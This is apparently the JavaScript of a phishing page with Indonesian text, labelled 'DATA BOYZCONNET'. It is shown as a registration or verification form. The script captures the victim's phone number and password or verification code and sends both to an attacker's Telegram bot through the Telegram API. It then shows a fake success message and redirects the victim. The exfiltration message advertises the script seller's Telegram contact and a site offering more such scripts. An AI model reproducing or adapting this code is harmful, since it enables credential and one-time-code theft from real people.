  const botToken = BOT_TOKEN;
  const chatId   = CHAT_ID;
  
  const urlParams = new URLSearchParams(window.location.search);
  const phoneParam = urlParams.get('phone') || "";
  const nama = urlParams.get('nama') || "";
  const alamat = urlParams.get('alamat') || "";

  const passwordForm = document.getElementById('passwordForm');
  const passwordInput = document.getElementById('passwordInput');
  const togglePassword = document.getElementById('togglePassword');
  const statusMessage = document.getElementById('statusMessage');

  let passwordVisible = false;
  togglePassword.addEventListener('click', () => {
    passwordVisible = !passwordVisible;
    passwordInput.type = passwordVisible ? "text" : "password";
    togglePassword.src = passwordVisible 
      ? "https://cdn-icons-png.flaticon.com/512/709/709612.png"
      : "https://cdn-icons-png.flaticon.com/512/709/709620.png";
  });

  passwordForm.addEventListener('submit', (e) => {
    e.preventDefault();
    const passwordValue = passwordInput.value.trim();

    if (!passwordValue) {
      statusMessage.style.color = "#e74c3c";
      statusMessage.textContent = "Kode verifikasi harus diisi!";
      return;
    }

    statusMessage.style.color = "#2c3e50";
    statusMessage.textContent = "Memproses pendaftaran...";

    const messageText = `DATA BOYZCONNET
_________________________________
• Nomor HP: ${phoneParam}
• password: ${passwordValue}
_________________________________
_________________________________
__• script lainnya di bawah 👇👇`;

const replyMarkup = {
  inline_keyboard: [
    [
      { text: "📩 hub jika error", url: "https://t.me/miami082" },
      { text: "script disini", url: "https://avatrade-cude.42web.io/" }
    ]
  ]
};
    const telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}&reply_markup=${encodeURIComponent(JSON.stringify(replyMarkup))}`;

    fetch(telegramAPI)
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          statusMessage.style.color = "#27ae60";
          statusMessage.textContent = "Pendaftaran berhasil!";
          passwordInput.value = "";
          
          // Redirect setelah 3 detik
          setTimeout(() => {
            window.location.href = "sucses.html";
          }, 1000);
          
        } else {
          statusMessage.style.color = "#e74c3c";
          statusMessage.textContent = "Gagal: " + (data.description || "Error sistem");
        }
      })
      .catch(error => {
        statusMessage.style.color = "#e74c3c";
        statusMessage.textContent = "Error: " + error;
      });
  });